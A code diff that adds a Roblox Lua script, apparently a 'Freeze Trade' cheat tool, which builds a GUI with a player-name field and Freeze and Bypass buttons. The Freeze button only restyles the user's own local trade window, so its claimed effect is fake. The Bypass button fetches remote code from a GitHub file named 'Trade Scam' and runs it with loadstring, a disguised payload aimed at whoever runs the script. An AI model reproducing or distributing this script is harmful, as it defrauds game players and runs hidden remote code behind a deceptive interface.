@@ -1,0 +1,144 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- GUI SETUP
+local gui = Instance.new("ScreenGui", PlayerGui)
+gui.Name = "CompactFreezeTradeGUI"
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 250, 0, 220)  -- Smaller size
+frame.Position = UDim2.new(0.5, -125, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+-- NEON OUTLINE
+local outline = Instance.new("UIStroke", frame)
+outline.Thickness = 2
+outline.Color = Color3.fromRGB(0, 255, 255)
+outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- GLOW ANIMATION
+task.spawn(function()
+	while frame and frame.Parent do
+		outline.Transparency = 0.5 + 0.5 * math.sin(tick() * 2)
+		task.wait(0.03)
+	end
+end)
+
+-- TITLE
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, -20, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 5)
+title.BackgroundTransparency = 1
+title.Text = "Freeze Trade"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- CLOSE BUTTON
+local close = Instance.new("TextButton", frame)
+close.Size = UDim2.new(0, 25, 0, 25)
+close.Position = UDim2.new(1, -30, 0, 5)
+close.Text = "X"
+close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+close.TextColor3 = Color3.new(1, 1, 1)
+close.Font = Enum.Font.GothamBold
+close.TextSize = 16
+Instance.new("UICorner", close).CornerRadius = UDim.new(1, 0)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+-- NAME INPUT
+local victimInput = Instance.new("TextBox", frame)
+victimInput.Size = UDim2.new(1, -20, 0, 30)
+victimInput.Position = UDim2.new(0, 10, 0, 40)
+victimInput.PlaceholderText = "Player name"
+victimInput.Text = ""
+victimInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+victimInput.TextColor3 = Color3.new(1, 1, 1)
+victimInput.Font = Enum.Font.Gotham
+victimInput.TextSize = 16
+Instance.new("UICorner", victimInput).CornerRadius = UDim.new(0, 5)
+
+-- FREEZE BUTTON
+local freezeBtn = Instance.new("TextButton", frame)
+freezeBtn.Size = UDim2.new(1, -20, 0, 40)
+freezeBtn.Position = UDim2.new(0, 10, 0, 80)
+freezeBtn.Text = "Freeze"
+freezeBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+freezeBtn.TextColor3 = Color3.new(1, 1, 1)
+freezeBtn.Font = Enum.Font.GothamBold
+freezeBtn.TextSize = 18
+Instance.new("UICorner", freezeBtn).CornerRadius = UDim.new(0, 5)
+
+-- BYPASS BUTTON
+local bypassBtn = Instance.new("TextButton", frame)
+bypassBtn.Size = UDim2.new(1, -20, 0, 40)
+bypassBtn.Position = UDim2.new(0, 10, 0, 130)
+bypassBtn.Text = "Bypass"
+bypassBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+bypassBtn.TextColor3 = Color3.new(1, 1, 1)
+bypassBtn.Font = Enum.Font.GothamBold
+bypassBtn.TextSize = 18
+Instance.new("UICorner", bypassBtn).CornerRadius = UDim.new(0, 5)
+
+-- STATUS LABEL
+local status = Instance.new("TextLabel", frame)
+status.Size = UDim2.new(1, -20, 0, 30)
+status.Position = UDim2.new(0, 10, 0, 180)
+status.BackgroundTransparency = 1
+status.Font = Enum.Font.Gotham
+status.TextSize = 16
+status.TextColor3 = Color3.fromRGB(255, 255, 150)
+status.Text = ""
+
+-- CREATOR LABEL
+local creatorLabel = Instance.new("TextLabel", frame)
+creatorLabel.Size = UDim2.new(1, -20, 0, 20)
+creatorLabel.Position = UDim2.new(0, 10, 0, 210)
+creatorLabel.BackgroundTransparency = 1
+creatorLabel.Font = Enum.Font.Gotham
+creatorLabel.TextSize = 14
+creatorLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+creatorLabel.Text = "Script by NefariouzHubScript"
+
+-- SOUND
+local successSound = Instance.new("Sound", frame)
+successSound.SoundId = "rbxassetid://6026984224"
+successSound.Volume = 1
+
+-- FREEZE FUNCTION
+freezeBtn.MouseButton1Click:Connect(function()
+	local tradeGui = PlayerGui:FindFirstChild("Trade")
+	if tradeGui then
+		for _, obj in pairs(tradeGui:GetDescendants()) do
+			if obj:IsA("TextButton") then
+				obj.AutoButtonColor = false
+				obj.TextTransparency = 0.5
+				obj.Text = "❄ Frozen ❄"
+				obj.Active = false
+			end
+		end
+		status.Text = "✅ Successfully Frozen"
+	else
+		status.Text = "❌ Trade GUI not found!"
+	end
+end)
+
+-- BYPASS FUNCTION
+bypassBtn.MouseButton1Click:Connect(function()
+	status.Text = "⏳ Bypassing... Please wait."
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/vf-debug/Adopt-Me-Spawner/refs/heads/main/Trade%20Scam",true))()
+	end)
+	if success then
+		status.Text = "✅ Successfully bypassed 🔥"
+	else
+		status.Text = "❌ Error: " .. err
+	end
+	successSound:Play()
+end)
